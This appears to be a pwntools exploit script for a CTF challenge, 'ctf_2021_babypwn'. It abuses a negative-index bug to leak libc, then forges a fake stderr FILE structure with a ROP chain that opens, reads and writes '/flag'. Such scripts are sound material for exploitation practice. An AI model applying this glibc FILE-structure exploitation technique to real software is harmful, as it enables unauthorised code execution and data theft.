from pwn import *
import sys
remote_addr = ["",]
libc = ELF('./libc.so.6')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./ctf_2021_babypwn")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)
def add(len, double):
    sa(b'\n', b'1')
    sa(b'len?\n', str(len).encode())
    sa(b'double?\n', str(double).encode())

def delete(idx):
    sa(b'\n', b'2')
    sa(b'idx?\n', str(idx).encode())

def show(idx):
    sa(b'\n', b'3')
    sa(b'idx?\n', str(idx).encode())

def edit(idx, content):
    sa(b'\n', b'4')
    sa(b'idx?\n', str(idx).encode())
    sa(b'ok\n', content)

debug('''
    b *$rebase(0x150c)
    b *$rebase(0x15a7)
    b *$rebase(0x162f)
    b *$rebase(0x14cb)
''')

add(0xb0, 1)
show(-8)

libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1f3703
pr('libc.address', libc.address)

fake_IO_addr = libc.sym['_IO_2_1_stderr_']
magic = libc.sym['svcudp_reply'] + 0x1a
leave_ret = libc.address + 0x52d72
pop_rdi = libc.address + 0x2daa2
pop_rsi = libc.address + 0x37c0a
pop_rdx = libc.address + 0x1066e1

rop_address = fake_IO_addr + 0xe0 + 0xe8 + 0x70

orw_rop = b'/flag\x00\x00\x00'
orw_rop += flat(pop_rdx, 0, fake_IO_addr - 0x10)
orw_rop += flat(pop_rdi, rop_address)
orw_rop += flat(pop_rsi, 0)
orw_rop += flat(libc.sym['open'])
orw_rop += flat(pop_rdi, 3)
orw_rop += flat(pop_rsi, rop_address + 0x100)
orw_rop += flat(pop_rdx, 0x50, 0)
orw_rop += flat(libc.sym['read'])
orw_rop += flat(pop_rdi, 1)
orw_rop += flat(pop_rsi, rop_address + 0x100)
orw_rop += flat(pop_rdx, 0x50, 0)
orw_rop += flat(libc.sym['write'])

payload = p64(0) + p64(leave_ret) + p64(1) + p64(2)
payload = payload.ljust(0x38, b'\x00') + p64(rop_address)
payload = payload.ljust(0x90, b'\x00') + p64(fake_IO_addr + 0xe0)
payload = payload.ljust(0xc8, b'\x00') + p64(libc.sym['_IO_wfile_jumps'])
payload = payload.ljust(0xd0 + 0xe0, b'\x00') + p64(fake_IO_addr + 0xe0 + 0xe8)
payload = payload.ljust(0xd0 + 0xe8 + 0x68, b'\x00') + p64(magic)
payload =  p64(0) * 2 + payload + orw_rop
edit(-8, payload)
sa(b'\n', b'1')
sa(b'len?\n', str(len).encode())


shell()
